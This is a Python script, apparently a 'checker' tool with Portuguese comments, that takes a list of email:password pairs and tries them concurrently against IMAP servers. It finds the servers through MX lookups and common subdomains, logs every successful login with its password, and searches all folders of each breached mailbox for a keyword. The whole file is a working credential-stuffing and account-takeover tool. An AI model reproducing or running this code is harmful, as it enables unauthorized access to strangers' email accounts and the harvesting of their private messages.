import argparse
import gevent
from gevent import monkey
from gevent.pool import Pool
import dns.resolver
import logging
from imap_tools import MailBox, A
from typing import List, Tuple, Optional

# Arte ASCII
ascii_art = r"""
  ____  _            _   _           
 |  _ \| |          | | | |          
 | |_) | | ___  ___ | |_| |_ ____ __ 
 |  _ <| |/ _ \/ __| __| __/ _ \ '__| 
 | |_) | |  __/\__ \ |_| ||  __/ |   
 |____/|_|\___||___/\__|\__\___|_|   Super Mail Search 
                                      By: ARDX
"""

def print_ascii_art():
    """Imprime a arte ASCII e pede para pressionar Enter."""    
    print(ascii_art)
    input("Pressione Enter para continuar...")

# Aplicar monkey patch para tornar o código compatível com gevent
monkey.patch_all()

# Configuração básica de logging para mostrar mensagens de erro e informações essenciais
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def detect_encoding(file_path: str) -> str:
    """Detecta a codificação do arquivo."""    
    import chardet
    try:
        with open(file_path, 'rb') as f:
            raw_data = f.read()
            result = chardet.detect(raw_data)
            encoding = result['encoding']
            if encoding is None:
                encoding = 'utf-8'  # Codificação padrão se a detecção falhar
    except Exception as e:
        logging.error(f'Erro ao detectar codificação do arquivo {file_path}: {e}')
        encoding = 'utf-8'  # Default para utf-8 em caso de erro
    return encoding

def read_credentials(file_path: str) -> List[Tuple[str, str]]:
    """Lê as credenciais de um arquivo."""    
    credentials = []
    encoding = detect_encoding(file_path)
    try:
        with open(file_path, 'r', encoding=encoding) as f:
            for line in f:
                line = line.strip()
                if not line or ':' not in line:
                    continue
                email, password = line.split(':', 1)
                credentials.append((email.strip(), password.strip()))
    except FileNotFoundError as e:
        logging.error(f'Arquivo de credenciais não encontrado: {e}')
    except Exception as e:
        logging.error(f'Erro ao ler o arquivo de credenciais: {e}')
    return credentials

def read_imap_servers(file_path: str) -> List[Tuple[str, int]]:
    """Lê servidores IMAP e suas portas de um arquivo."""    
    servers = []
    encoding = detect_encoding(file_path)
    try:
        with open(file_path, 'r', encoding=encoding) as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                
                if ':' not in line:
                    logging.warning(f'Linha sem formato de servidor e porta encontrada: {line}')
                    continue
                
                parts = line.split(':')
                if len(parts) < 2:
                    logging.warning(f'Linha com formato incorreto: {line}')
                    continue
                
                server = parts[0].strip()
                port_string = parts[1].strip()
                
                try:
                    ports = port_string.split(',')
                    for p in ports:
                        p = p.strip()
                        if p.isdigit():
                            port_number = int(p)
                            if port_number in {143, 993}:
                                servers.append((server, port_number))
                            else:
                                logging.warning(f'Porta inválida para o servidor {server}: {port_number}')
                        else:
                            logging.warning(f'Porta inválida (não numérica) para o servidor {server}: {p}')
                except ValueError:
                    logging.warning(f'Porta inválida para o servidor {server}: {port_string}')
                    continue

    except FileNotFoundError as e:
        logging.error(f'Arquivo de servidores IMAP não encontrado: {e}')
    except Exception as e:
        logging.error(f'Erro ao ler o arquivo de servidores IMAP: {e}')
    
    return servers

def discover_imap_servers(domain: str) -> List[Tuple[str, int]]:
    """Descobre servidores IMAP usando registros MX e subdomínios comuns."""    
    servers = []
    try:
        # Ajuste no timeout e lifetime para maior tolerância
        resolver = dns.resolver.Resolver()
        resolver.timeout = 10  # Tempo máximo de espera para a resposta DNS
        resolver.lifetime = 15  # Tempo total de vida da resolução DNS
        
        # Descobrir servidores IMAP através de registros MX
        mx_records = resolver.resolve(domain, 'MX')
        for r in mx_records:
            server = str(r.exchange).rstrip('.')
            servers.append((server, 993))  # Porta padrão para IMAP
            servers.append((server, 143))  # Porta padrão para IMAP
    except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN) as e:
        logging.warning(f'Erro ao buscar registros MX para {domain}: {e}')
    except Exception as e:
        logging.error(f'Erro ao descobrir servidores IMAP para {domain}: {e}')
    
    # Adicionar subdomínios comuns
    subdomains = [f'imap.{domain}', f'webmail.{domain}', f'mail.{domain}', f'imap.mail.{domain}']
    for subdomain in subdomains:
        servers.append((subdomain, 993))
        servers.append((subdomain, 143))
    
    return servers

def try_connection(email: str, password: str, server: str, port: int, timeout: int = 60) -> Optional[MailBox]:
    """Tenta conectar a um servidor IMAP com as credenciais fornecidas."""    
    try:
        logging.debug(f'Tentando conectar ao servidor IMAP {server}:{port} com {email}')
        mailbox = MailBox(server, port, timeout=timeout)
        mailbox.login(email, password)
        return mailbox
    except (ConnectionRefusedError, TimeoutError, OSError) as e:
        logging.error(f'Erro ao conectar ou autenticar no servidor {server}:{port} com {email}: {e}')
    except Exception as e:
        logging.error(f'Erro inesperado ao conectar ou autenticar no servidor {server}:{port} com {email}: {e}')
    return None

def search_criteria(mailbox: MailBox, criteria: str) -> bool:
    """Busca por e-mails contendo o critério especificado em todas as pastas disponíveis."""    
    try:
        # Listar todas as pastas disponíveis
        folders = mailbox.folder.list()
        logging.info(f'Pastas disponíveis: {[folder.name for folder in folders]}')

        # Iterar sobre todas as pastas e buscar o critério
        for folder in folders:
            mailbox.folder.set(folder.name)  # Definir a pasta atual
            logging.info(f'Buscando na pasta: {folder.name}')
            messages = mailbox.fetch(A(text=criteria))
            for msg in messages:
                logging.info(f'Palavra-chave encontrada no e-mail UID: {msg.uid} na pasta {folder.name}')
                return True  # Retorna True se encontrar pelo menos um e-mail com o critério
        return False  # Retorna False se não encontrar nenhum e-mail com o critério
    except Exception as e:
        logging.error(f'Erro ao buscar e-mails: {e}')
        return False

def process_email(email: str, password: str, criteria: str, logged_output_file: str, found_output_file: str):
    """Processa cada conta de e-mail tentando conexões com vários servidores IMAP e registra o resultado final."""    
    if '@' not in email:
        logging.error(f'E-mail inválido encontrado: {email}')
        return

    domain = email.split('@')[1]
    servers_to_try = discover_imap_servers(domain)
    
    # Adicionar servidores da lista fixa
    servers_from_file = read_imap_servers('imap_servers.txt')  # Usar arquivo fixo
    servers_to_try.extend(servers_from_file)

    logging.debug(f'Lista de servidores para {email}: {servers_to_try}')

    found_criteria = False
    logged = False

    for server, port in servers_to_try:
        try:
            mailbox = try_connection(email, password, server, port)
            if mailbox:
                # Registra e-mail, senha, servidor e porta se o login foi bem-sucedido
                with open(logged_output_file, 'a') as f:
                    f.write(f'{email}:{password}:{server}:{port}\n')
                
                # Verifica se a palavra-chave foi encontrada
                found_criteria = search_criteria(mailbox, criteria)
                mailbox.logout()
                
                if found_criteria:
                    with open(found_output_file, 'a') as f:
                        f.write(f'{email}:{password}\n')
                return
        except Exception as e:
            logging.error(f'Erro ao processar o servidor {server}:{port} para {email}: {e}')
    
    # Se o login não foi bem-sucedido, não faz nada no arquivo `logged_output_file`
    # e não adiciona ao arquivo `found_output_file` se a palavra-chave não foi encontrada

if __name__ == "__main__":
    print_ascii_art()

    parser = argparse.ArgumentParser(description='Pesquisar e-mails para uma palavra-chave específica.')
    parser.add_argument('-i', '--credentials_file', required=True, help='Arquivo com e-mails e senhas')
    parser.add_argument('-o', '--logged_output_file', required=True, help='Arquivo de saída para emails logados')
    parser.add_argument('-g', '--found_output_file', required=True, help='Arquivo de saída para e-mails que encontraram a palavra-chave')
    parser.add_argument('-c', '--criteria', required=True, help='Palavra-chave a ser buscada')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Número de threads (tarefas concorrentes)')

    args = parser.parse_args()
    
    credentials = read_credentials(args.credentials_file)
    
    pool = Pool(args.threads)
    for email, password in credentials:
        pool.spawn(process_email, email, password, args.criteria, args.logged_output_file, args.found_output_file)
    pool.join()
